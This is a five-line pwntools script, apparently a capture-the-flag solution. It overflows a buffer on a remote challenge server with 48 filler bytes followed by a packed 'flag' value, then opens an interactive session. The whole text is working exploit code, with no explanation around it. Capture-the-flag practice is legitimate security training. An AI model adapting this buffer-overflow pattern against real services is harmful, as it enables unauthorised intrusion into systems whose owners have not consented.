from pwn import *
payload=b"a"*48+p64(0x67616c66)
r=remote("thekidofarcrania.com",35235)
r.sendlineafter(b'text:',payload)
r.interactive()
